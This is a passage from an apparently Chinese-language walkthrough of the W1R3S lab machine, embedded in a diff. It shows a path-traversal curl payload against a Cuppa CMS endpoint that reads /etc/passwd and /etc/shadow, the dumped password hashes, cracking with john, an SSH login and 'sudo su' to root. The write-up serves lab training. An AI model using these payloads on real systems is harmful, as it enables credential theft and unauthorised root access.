+</span></span><span class="line"><span class="cl">        width:22px;
+</span></span><span class="line"><span class="cl">        height:22px;
+</span></span><span class="line"><span class="cl">        cursor:pointer;
+</span></span><span class="line"><span class="cl">        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+</span></span><span class="line"><span class="cl">        background-position: center;
+</span></span><span class="line"><span class="cl">        background-size: 13px;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .content_alert_config{
+</span></span><span class="line"><span class="cl">        position:relative;
+</span></span><span class="line"><span class="cl">        clear:both;
+</span></span><span class="line"><span class="cl">        margin: 2px;
+</span></span><span class="line"><span class="cl">        margin-top: 0px;
+</span></span><span class="line"><span class="cl">        height: 401px;
+</span></span><span class="line"><span class="cl">        padding: 10px;
+</span></span><span class="line"><span class="cl">        overflow: auto;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">&lt;/style&gt;
+</span></span><span class="line"><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="cl">        function CloseDefaultAlert(){
+</span></span><span class="line"><span class="cl">                cuppa.setContent({&#39;load&#39;:false, duration:0.2});
+</span></span><span class="line"><span class="cl">        cuppa.blockade({&#39;load&#39;:false, duration:0.2, delay:0.1});
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;div class=&#34;alert_config_field&#34; id=&#34;alert&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;div class=&#34;alert_config_top&#34;&gt;
+</span></span><span class="line"><span class="cl">        &lt;strong&gt;Configuration&lt;/strong&gt;:         &lt;div class=&#34;btnClose_alert&#34; id=&#34;btnClose_alert&#34; onclick=&#34;CloseDefaultAlert()&#34;&gt;&lt;/div&gt;
+</span></span><span class="line"><span class="cl">    &lt;/div&gt;
+</span></span><span class="line"><span class="cl">    &lt;div id=&#34;content_alert_config&#34; class=&#34;content_alert_config&#34;&gt;
+</span></span><span class="line"><span class="cl">        root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span></span><span class="line"><span class="cl">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span></span><span class="line"><span class="cl">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span></span><span class="line"><span class="cl">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span></span><span class="line"><span class="cl">syslog:x:104:108::/home/syslog:/bin/false
+</span></span><span class="line"><span class="cl">_apt:x:105:65534::/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">messagebus:x:106:110::/var/run/dbus:/bin/false
+</span></span><span class="line"><span class="cl">uuidd:x:107:111::/run/uuidd:/bin/false
+</span></span><span class="line"><span class="cl">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+</span></span><span class="line"><span class="cl">whoopsie:x:109:117::/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+</span></span><span class="line"><span class="cl">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+</span></span><span class="line"><span class="cl">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+</span></span><span class="line"><span class="cl">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+</span></span><span class="line"><span class="cl">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+</span></span><span class="line"><span class="cl">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+</span></span><span class="line"><span class="cl">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+</span></span><span class="line"><span class="cl">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+</span></span><span class="line"><span class="cl">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+</span></span><span class="line"><span class="cl">saned:x:119:127::/var/lib/saned:/bin/false
+</span></span><span class="line"><span class="cl">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+</span></span><span class="line"><span class="cl">w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
+</span></span><span class="line"><span class="cl">sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
+</span></span><span class="line"><span class="cl">mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">    &lt;/div&gt;
+</span></span><span class="line"><span class="cl">&lt;/div&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>关于这个payload，就是使用curl方法读取alertConfigField.php，参数为urlConfig=../../../../../../../../../etc/passwd，请求需要使用url编码，但是这一步仍有疑惑。</p>
+<p>同样在这一步存在密码hash的地方都是用x代替的，再去读取shadow中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.152.132/administrator/alerts/alertConfigField.php
+</span></span><span class="line"><span class="cl">&lt;style&gt;
+</span></span><span class="line"><span class="cl">    .new_content{
+</span></span><span class="line"><span class="cl">        position: fixed;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .alert_config_field{
+</span></span><span class="line"><span class="cl">        font-size:12px;
+</span></span><span class="line"><span class="cl">        background:#FFF;
+</span></span><span class="line"><span class="cl">        position:relative;
+</span></span><span class="line"><span class="cl">        border-radius: 3px;
+</span></span><span class="line"><span class="cl">        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+</span></span><span class="line"><span class="cl">        overflow:hidden;
+</span></span><span class="line"><span class="cl">        position:fixed;
+</span></span><span class="line"><span class="cl">        top:50%;
+</span></span><span class="line"><span class="cl">        left:50%;
+</span></span><span class="line"><span class="cl">        width:600px;
+</span></span><span class="line"><span class="cl">        height:440px;
+</span></span><span class="line"><span class="cl">        margin-left:-300px;
+</span></span><span class="line"><span class="cl">        margin-top:-220px;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .alert_config_top{
+</span></span><span class="line"><span class="cl">        position: relative;
+</span></span><span class="line"><span class="cl">        margin: 2px;
+</span></span><span class="line"><span class="cl">        margin-bottom: 0px;
+</span></span><span class="line"><span class="cl">        border: 1px solid #D2D2D2;
+</span></span><span class="line"><span class="cl">        background: #4489F8;
+</span></span><span class="line"><span class="cl">        overflow: auto;
+</span></span><span class="line"><span class="cl">        color:#FFF;
+</span></span><span class="line"><span class="cl">        font-size: 13px;
+</span></span><span class="line"><span class="cl">        padding: 7px 5px;
+</span></span><span class="line"><span class="cl">        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+</span></span><span class="line"><span class="cl">        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .description_alert{
+</span></span><span class="line"><span class="cl">        position:relative;
+</span></span><span class="line"><span class="cl">        font-size:12px;
+</span></span><span class="line"><span class="cl">        text-shadow:0 1px #FFFFFF;
+</span></span><span class="line"><span class="cl">        font-weight: normal;
+</span></span><span class="line"><span class="cl">        padding: 5px 0px 5px 0px;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .btnClose_alert{
+</span></span><span class="line"><span class="cl">        position:absolute;
+</span></span><span class="line"><span class="cl">        top: 4px; right: 2px;
+</span></span><span class="line"><span class="cl">        width:22px;
+</span></span><span class="line"><span class="cl">        height:22px;
+</span></span><span class="line"><span class="cl">        cursor:pointer;
+</span></span><span class="line"><span class="cl">        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+</span></span><span class="line"><span class="cl">        background-position: center;
+</span></span><span class="line"><span class="cl">        background-size: 13px;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .content_alert_config{
+</span></span><span class="line"><span class="cl">        position:relative;
+</span></span><span class="line"><span class="cl">        clear:both;
+</span></span><span class="line"><span class="cl">        margin: 2px;
+</span></span><span class="line"><span class="cl">        margin-top: 0px;
+</span></span><span class="line"><span class="cl">        height: 401px;
+</span></span><span class="line"><span class="cl">        padding: 10px;
+</span></span><span class="line"><span class="cl">        overflow: auto;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">&lt;/style&gt;
+</span></span><span class="line"><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="cl">        function CloseDefaultAlert(){
+</span></span><span class="line"><span class="cl">                cuppa.setContent({&#39;load&#39;:false, duration:0.2});
+</span></span><span class="line"><span class="cl">        cuppa.blockade({&#39;load&#39;:false, duration:0.2, delay:0.1});
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;div class=&#34;alert_config_field&#34; id=&#34;alert&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;div class=&#34;alert_config_top&#34;&gt;
+</span></span><span class="line"><span class="cl">        &lt;strong&gt;Configuration&lt;/strong&gt;:         &lt;div class=&#34;btnClose_alert&#34; id=&#34;btnClose_alert&#34; onclick=&#34;CloseDefaultAlert()&#34;&gt;&lt;/div&gt;
+</span></span><span class="line"><span class="cl">    &lt;/div&gt;
+</span></span><span class="line"><span class="cl">    &lt;div id=&#34;content_alert_config&#34; class=&#34;content_alert_config&#34;&gt;
+</span></span><span class="line"><span class="cl">        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
+</span></span><span class="line"><span class="cl">daemon:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">bin:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">sys:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">sync:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">games:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">man:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">lp:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">mail:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">news:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">uucp:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">proxy:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
+</span></span><span class="line"><span class="cl">backup:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">list:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">irc:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">gnats:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">nobody:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">systemd-timesync:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">systemd-network:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">systemd-resolve:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">systemd-bus-proxy:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">syslog:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">_apt:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">messagebus:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">uuidd:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">lightdm:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">whoopsie:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">avahi-autoipd:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">avahi:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">dnsmasq:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">colord:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">speech-dispatcher:!:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">hplip:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">kernoops:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">pulse:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">rtkit:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">saned:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">usbmux:*:17379:0:99999:7:::
+</span></span><span class="line"><span class="cl">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
+</span></span><span class="line"><span class="cl">sshd:*:17554:0:99999:7:::
+</span></span><span class="line"><span class="cl">ftp:*:17554:0:99999:7:::
+</span></span><span class="line"><span class="cl">mysql:!:17554:0:99999:7:::
+</span></span><span class="line"><span class="cl">    &lt;/div&gt;
+</span></span><span class="line"><span class="cl">&lt;/div&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="密码破解">密码破解</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
+</span></span><span class="line"><span class="cl">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
+</span></span><span class="line"><span class="cl">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可能是密码简单，破解起来也很顺利，但是没有root用户的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ john hash
+</span></span><span class="line"><span class="cl">Warning: detected hash type &#34;sha512crypt&#34;, but the string is also recognized as &#34;HMAC-SHA256&#34;
+</span></span><span class="line"><span class="cl">Use the &#34;--format=HMAC-SHA256&#34; option to force loading these as that type instead
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+</span></span><span class="line"><span class="cl">Cost 1 (iteration count) is 5000 for all loaded hashes
+</span></span><span class="line"><span class="cl">Will run 4 OpenMP threads
+</span></span><span class="line"><span class="cl">Proceeding with single, rules:Single
+</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="line"><span class="cl">www-data         (www-data)   
+</span></span><span class="line"><span class="cl">Almost done: Processing the remaining buffered candidate passwords, if any.
+</span></span><span class="line"><span class="cl">Proceeding with wordlist:/usr/share/john/password.lst
+</span></span><span class="line"><span class="cl">computer         (w1r3s)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是也算找到了立足点，先登录一下w1r3s</p>
+<p>成功登录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ ssh w1r3s@192.168.152.132  
+</span></span><span class="line"><span class="cl">The authenticity of host &#39;192.168.152.132 (192.168.152.132)&#39; can&#39;t be established.
+</span></span><span class="line"><span class="cl">ED25519 key fingerprint is SHA256:Bue5VbUKeMSJMQdicmcMPTCv6xvD7I+20Ki8Um8gcWM.
+</span></span><span class="line"><span class="cl">This key is not known by any other names.
+</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;192.168.152.132&#39; (ED25519) to the list of known hosts.
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">Think this is the way?
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">Well,........possibly.
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">w1r3s@192.168.152.132&#39;s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">108 packages can be updated.
+</span></span><span class="line"><span class="cl">6 updates are security updates.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.....You made it huh?....
+</span></span><span class="line"><span class="cl">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
+</span></span><span class="line"><span class="cl">w1r3s@W1R3S:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="提权">提权</h2>
+<p>已经给出了明显的提示，作为一个靶场，很确定的就是通过该账户去进行提权操作，当然有兴趣也可以去看看wordpress是否还有什么内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">Think this is the way?
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">Well,........possibly.
+</span></span><span class="line"><span class="cl">----------------------
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进行一个枚举操作</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">w1r3s@W1R3S:~$ whoami
+</span></span><span class="line"><span class="cl">w1r3s
+</span></span><span class="line"><span class="cl">w1r3s@W1R3S:~$ ls
+</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  examples.desktop  ftp  Music  Pictures  Public  Templates  Videos
+</span></span><span class="line"><span class="cl">w1r3s@W1R3S:~$ id
+</span></span><span class="line"><span class="cl">uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有sudo的权限想提权就简单了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">w1r3s@W1R3S:~$ sudo -l
+</span></span><span class="line"><span class="cl">[sudo] password for w1r3s: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries for w1r3s on W1R3S.localdomain:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User w1r3s may run the following commands on W1R3S.localdomain:
+</span></span><span class="line"><span class="cl">    (ALL : ALL) ALL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>显示有all，直接sudo su</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">w1r3s@W1R3S:~$ sudo su
+</span></span><span class="line"><span class="cl">root@W1R3S:/# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@W1R3S:/# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@W1R3S:/# id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
+</span></span><span class="line"><span class="cl">root@W1R3S:/# uname -a
+</span></span><span class="line"><span class="cl">Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+</span></span><span class="line"><span class="cl">root@W1R3S:/# ip a
+</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
+</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
